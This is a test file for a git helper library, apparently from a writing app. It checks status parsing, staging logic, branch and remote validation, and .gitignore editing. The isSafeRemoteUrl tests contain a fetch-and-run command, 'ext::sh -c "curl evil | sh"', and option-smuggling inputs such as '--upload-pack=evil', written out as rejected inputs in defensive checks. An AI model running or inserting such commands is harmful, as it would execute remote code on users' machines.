import { describe, expect, it } from 'vitest';
import {
  canCommit,
  isFullyStaged,
  parseGitStatus,
  selectAllState,
  isSafeRemoteUrl,
  isValidBranchName,
  touchesWorkingTree,
  withIgnoredPath,
  type GitFileStatus,
} from '../src/index.js';

/** Builds NUL-separated porcelain v1 output from its fields. */
function porcelain(...fields: readonly string[]): string {
  return fields.map((field) => `${field}\0`).join('');
}

describe('parseGitStatus', () => {
  it('reads the index and worktree status of one file', () => {
    const [entry] = parseGitStatus(porcelain('M  chapters/intro.md'));

    expect(entry).toMatchObject({
      path: 'chapters/intro.md',
      indexStatus: 'M',
      worktreeStatus: ' ',
      groups: ['staged'],
    });
  });

  it('groups a file that is both staged and modified again', () => {
    expect(parseGitStatus(porcelain('MM a.md'))[0]?.groups).toEqual(['staged', 'unstaged']);
  });

  it('groups an unstaged modification', () => {
    expect(parseGitStatus(porcelain(' M a.md'))[0]?.groups).toEqual(['unstaged']);
  });

  it('groups untracked files', () => {
    expect(parseGitStatus(porcelain('?? new.md'))[0]?.groups).toEqual(['untracked']);
  });

  it('counts every conflict pair as unstaged, never as staged', () => {
    for (const pair of ['DD', 'AU', 'UD', 'UA', 'DU', 'AA', 'UU']) {
      const [entry] = parseGitStatus(porcelain(`${pair} conflicted.md`));
      expect(entry?.groups, pair).toEqual(['unstaged']);
    }
  });

  it('reads a rename as one entry with its previous path', () => {
    const entries = parseGitStatus(porcelain('R  new.md', 'old.md'));

    expect(entries).toHaveLength(1);
    expect(entries[0]).toMatchObject({ path: 'new.md', previousPath: 'old.md' });
  });

  it('reads a copy the same way', () => {
    expect(parseGitStatus(porcelain('C  copy.md', 'source.md'))[0]?.previousPath).toBe('source.md');
  });

  it('does not invent a file from the second field of a rename', () => {
    const entries = parseGitStatus(porcelain('R  new.md', 'old.md', ' M other.md'));

    expect(entries.map((entry) => entry.path)).toEqual(['new.md', 'other.md']);
  });

  it('keeps paths with spaces and non-ASCII characters intact', () => {
    const entries = parseGitStatus(porcelain(' M chapters/Größe und Übermut.md', '?? 🌊 sea.md'));

    expect(entries.map((entry) => entry.path)).toEqual([
      'chapters/Größe und Übermut.md',
      '🌊 sea.md',
    ]);
  });

  it('returns nothing for a clean repository', () => {
    expect(parseGitStatus('')).toEqual([]);
  });

  it('ignores a truncated field rather than producing a nameless entry', () => {
    expect(parseGitStatus(porcelain('M'))).toEqual([]);
  });

  it('reports paths relative to the repository root, never absolute', () => {
    for (const entry of parseGitStatus(porcelain(' M a.md', '?? b/c.md'))) {
      expect(entry.path.startsWith('/')).toBe(false);
    }
  });
});

describe('staging state', () => {
  const staged = parseGitStatus(porcelain('M  a.md'))[0] as GitFileStatus;
  const partly = parseGitStatus(porcelain('MM b.md'))[0] as GitFileStatus;
  const untracked = parseGitStatus(porcelain('?? c.md'))[0] as GitFileStatus;

  it('treats a file with remaining worktree changes as not fully staged', () => {
    expect(isFullyStaged(staged)).toBe(true);
    expect(isFullyStaged(partly)).toBe(false);
    expect(isFullyStaged(untracked)).toBe(false);
  });

  it('reports the tri-state of the select-all checkbox', () => {
    expect(selectAllState([])).toBe('none');
    expect(selectAllState([untracked])).toBe('none');
    expect(selectAllState([staged])).toBe('all');
    expect(selectAllState([staged, untracked])).toBe('some');
  });

  it('allows a commit only with staged changes and a message', () => {
    expect(canCommit([staged], 'Add chapter')).toBe(true);
    expect(canCommit([staged], '   ')).toBe(false);
    expect(canCommit([untracked], 'Add chapter')).toBe(false);
    expect(canCommit([], 'Add chapter')).toBe(false);
  });
});

describe('touchesWorkingTree', () => {
  it('ignores events confined to the git directory, which git status itself causes', () => {
    expect(touchesWorkingTree(['.git/index'])).toBe(false);
    expect(touchesWorkingTree(['repo/.git/index', 'repo/.git/objects/ab/cdef'])).toBe(false);
  });

  it('reacts to a working-tree change, even alongside git-directory noise', () => {
    expect(touchesWorkingTree(['.git/index', 'chapters/intro.md'])).toBe(true);
  });

  it('does not mistake a file merely containing .git in its name', () => {
    expect(touchesWorkingTree(['notes/.gitignore-draft.md'])).toBe(true);
  });

  it('handles Windows separators', () => {
    expect(touchesWorkingTree(['repo\\.git\\index'])).toBe(false);
  });

  it('is false for no events at all', () => {
    expect(touchesWorkingTree([])).toBe(false);
  });
});

describe('isSafeRemoteUrl', () => {
  it('accepts the addresses people actually use', () => {
    expect(isSafeRemoteUrl('https://github.com/someone/book.git')).toBe(true);
    expect(isSafeRemoteUrl('http://git.example.invalid/book.git')).toBe(true);
    expect(isSafeRemoteUrl('ssh://git@example.invalid/book.git')).toBe(true);
    expect(isSafeRemoteUrl('git@github.com:someone/book.git')).toBe(true);
    expect(isSafeRemoteUrl('file:///Volumes/Backup/book.git')).toBe(true);
    expect(isSafeRemoteUrl('/Volumes/Backup/book.git')).toBe(true);
    expect(isSafeRemoteUrl('  https://example.invalid/book.git  ')).toBe(true);
  });

  it('refuses the transport that runs a command', () => {
    // `ext::` executes what follows, at the next fetch, on the author's
    // machine. A pasted address must not be able to do that.
    expect(isSafeRemoteUrl('ext::sh -c "curl evil | sh"')).toBe(false);
  });

  it('refuses an address git would read as an option', () => {
    expect(isSafeRemoteUrl('--upload-pack=evil')).toBe(false);
    expect(isSafeRemoteUrl('-x')).toBe(false);
  });

  it('refuses nothing at all, and things that are not addresses', () => {
    expect(isSafeRemoteUrl('')).toBe(false);
    expect(isSafeRemoteUrl('   ')).toBe(false);
    expect(isSafeRemoteUrl('book.git')).toBe(false);
    expect(isSafeRemoteUrl('../book.git')).toBe(false);
  });
});

describe('isValidBranchName', () => {
  it('accepts the names people give chapters and drafts', () => {
    expect(isValidBranchName('main')).toBe(true);
    expect(isValidBranchName('draft/chapter-3')).toBe(true);
    expect(isValidBranchName('überarbeitung')).toBe(true);
    expect(isValidBranchName('  trimmed  ')).toBe(true);
  });

  it('refuses a name git would read as an option', () => {
    expect(isValidBranchName('-f')).toBe(false);
    expect(isValidBranchName('--force')).toBe(false);
  });

  it('refuses the shapes git itself refuses', () => {
    expect(isValidBranchName('')).toBe(false);
    expect(isValidBranchName('   ')).toBe(false);
    expect(isValidBranchName('two words')).toBe(false);
    expect(isValidBranchName('a..b')).toBe(false);
    expect(isValidBranchName('a//b')).toBe(false);
    expect(isValidBranchName('/leading')).toBe(false);
    expect(isValidBranchName('trailing/')).toBe(false);
    expect(isValidBranchName('draft.lock')).toBe(false);
    expect(isValidBranchName('with:colon')).toBe(false);
    expect(isValidBranchName('with?question')).toBe(false);
    expect(isValidBranchName('with*star')).toBe(false);
    expect(isValidBranchName('with~tilde')).toBe(false);
    expect(isValidBranchName('with^caret')).toBe(false);
  });
});

describe('withIgnoredPath', () => {
  it('adds a path to an empty file', () => {
    expect(withIgnoredPath('', '.DS_Store')).toBe('.DS_Store\n');
  });

  it('adds one to a file that already lists others', () => {
    expect(withIgnoredPath('build/\n.DS_Store\n', 'notes.txt')).toBe(
      'build/\n.DS_Store\nnotes.txt\n',
    );
  });

  it('adds nothing that is already there', () => {
    const before = 'build/\n.DS_Store\n';
    expect(withIgnoredPath(before, '.DS_Store')).toBe(before);
    // Even where the file lists it with whitespace around it.
    expect(withIgnoredPath('  .DS_Store  \n', '.DS_Store')).toBe('  .DS_Store  \n');
  });

  it('copes with a file that does not end in a newline', () => {
    expect(withIgnoredPath('build/', 'notes.txt')).toBe('build/\nnotes.txt\n');
  });

  it('keeps the line ending the file already uses', () => {
    expect(withIgnoredPath('build/\r\n', 'notes.txt')).toBe('build/\r\nnotes.txt\r\n');
  });

  it('ignores a request to add nothing', () => {
    expect(withIgnoredPath('build/\n', '   ')).toBe('build/\n');
  });
});
